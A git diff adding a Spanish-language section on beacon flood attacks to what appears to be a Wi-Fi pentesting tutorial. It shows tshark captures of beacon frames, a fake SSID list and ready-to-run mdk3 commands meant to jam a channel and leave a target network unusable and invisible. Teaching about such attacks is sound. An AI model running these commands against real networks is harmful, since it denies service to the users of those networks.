@@ -1016,8 +1016,68 @@ Por aquí podemos ver los valores de cada uno de estos paquetes enviados:
 <img align="center" src="https://funkyimg.com/i/2W6iP.png">
 
 ¿Resultado?, lo que se conoce como un secuestro del ancho de banda, haciendo que la red quede completamente
-inoperativa durante un largo período de tiempo. No recomiendo hacer en nuestra propia red el ataque.
+inoperativa durante un largo período de tiempo. No recomiendo hacer el ataque en nuestra propia red.
 
+#### Beacon Flood Mode Attack
+
+Un **beacon** es un paquete que contiene información sobre el punto de acceso, como por ejemplo, en qué canal
+se encuentra, qué tipo de cifrado lleva, cómo se llama la red, etc.
+
+```bash
+┌─[✗]─[root@parrot]─[/home/s4vitar/Desktop]
+└──╼ #tshark -i wlan0mon -Y "wlan.fc.type_subtype==0x8" 2>/dev/null
+    1 0.000000000 AskeyCom_d4:16:78 → Broadcast    802.11 328 Beacon frame, SN=1585, FN=0, Flags=........C, BI=100, SSID=MOVISTAR_1677
+    2 0.307210202 AskeyCom_d4:16:78 → Broadcast    802.11 328 Beacon frame, SN=1588, FN=0, Flags=........C, BI=100, SSID=MOVISTAR_1677
+    3 0.614413670 AskeyCom_d4:16:78 → Broadcast    802.11 328 Beacon frame, SN=1591, FN=0, Flags=........C, BI=100, SSID=MOVISTAR_1677
+    4 0.921614210 AskeyCom_d4:16:78 → Broadcast    802.11 328 Beacon frame, SN=1594, FN=0, Flags=........C, BI=100, SSID=MOVISTAR_1677
+```
+
+La peculiaridad de los beacons es que estos se transmiten en claro, ya que las tarjetas de red y otros
+dispositivos necesitan poder recoger este tipo de paquetes y extraer la información necesaria para conectarse.
+
+A través de la herramienta **mdk3**, podemos generar un ataque conocido como **Beacon Flood Attack**,
+generando montón de paquetes Beacon con información falsa. ¿Qué conseguimos con esto?, pues bueno, uno de los
+ataques clásicos consistiría en generar montones de puntos de acceso situados en el mismo canal que un punto
+de acceso objetivo, logrando así dañar el espectro de onda de la red dejándola no operativa e invisible por los
+usuarios.
+
+```bash
+┌─[root@parrot]─[/home/s4vitar/Desktop]
+└──╼ #for i in $(seq 1 10); do echo "MyNetwork$i" >> redes.txt; done
+┌─[root@parrot]─[/home/s4vitar/Desktop]
+└──╼ #cat redes.txt 
+MyNetwork1
+MyNetwork2
+MyNetwork3
+MyNetwork4
+MyNetwork5
+MyNetwork6
+MyNetwork7
+MyNetwork8
+MyNetwork9
+MyNetwork10
+┌─[root@parrot]─[/home/s4vitar/Desktop]
+└──╼ #mdk3 wlan0mon b -f redes.txt -a -s 1000 -c 7
+```
+
+En este caso, estaríamos generando un buen puñado de puntos de acceso con los **ESSID** listados en el
+archivo, todos ellos posicionados en el canal 7. Para los curiosos, el parámetro '**-a**' lo que se encarga es
+de anunciar redes WPA2, y el parámetro '**-s**' establece la velocidad de los paquetes emitidos por segundo,
+que por defecto están establecidos a 50.
+
+Por si queréis ver cómo se vería todo desde un dispositivo tercero que trata de escanear o listar los puntos
+de acceso disponibles en el entorno:
+
+<img align="center" src="https://funkyimg.com/i/2W6s8.jpg">
+
+De hecho, hasta si queréis causar curiosidad en el ambiente, si corréis este modo de ataque con **mdk3** sin
+especificar parámetros:
+
+* mdk3 wlan0mon b
+
+Estaríamos generando puntos de acceso con estos **ESSID's**:
+
+<img align="center" src="https://funkyimg.com/i/2W6sd.png">
 
 
 
